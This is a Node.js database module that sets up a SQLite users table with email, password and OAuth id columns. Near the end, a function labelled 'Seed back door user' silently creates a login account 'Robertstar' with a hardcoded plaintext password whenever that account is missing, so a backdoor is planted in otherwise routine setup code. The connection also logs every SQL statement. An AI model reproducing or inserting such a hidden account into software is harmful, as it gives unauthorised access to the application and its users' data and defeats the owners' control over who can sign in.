import Database from 'better-sqlite3';
import path from 'path';
import bcrypt from 'bcrypt';

const dbPath = path.join(process.cwd(), 'database.sqlite');
console.log('Current working directory:', process.cwd());
console.log('Database path:', dbPath);
const db = new Database(dbPath, { verbose: console.log });

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

// Add OAuth columns if they don't exist
try {
  db.exec('ALTER TABLE users ADD COLUMN google_id TEXT UNIQUE');
} catch (e) { /* Column likely exists */ }

try {
  db.exec('ALTER TABLE users ADD COLUMN github_id TEXT UNIQUE');
} catch (e) { /* Column likely exists */ }

try {
  db.exec('ALTER TABLE users ADD COLUMN microsoft_id TEXT UNIQUE');
} catch (e) { /* Column likely exists */ }

// Seed back door user
const seedUser = () => {
  const stmt = db.prepare('SELECT * FROM users WHERE email = ?');
  const user = stmt.get('Robertstar');

  if (!user) {
    const hashedPassword = bcrypt.hashSync('Rm2214ri#', 10);
    const insert = db.prepare('INSERT INTO users (email, password) VALUES (?, ?)');
    insert.run('Robertstar', hashedPassword);
    console.log('Seeded user: Robertstar');
  }
};

seedUser();

export default db;
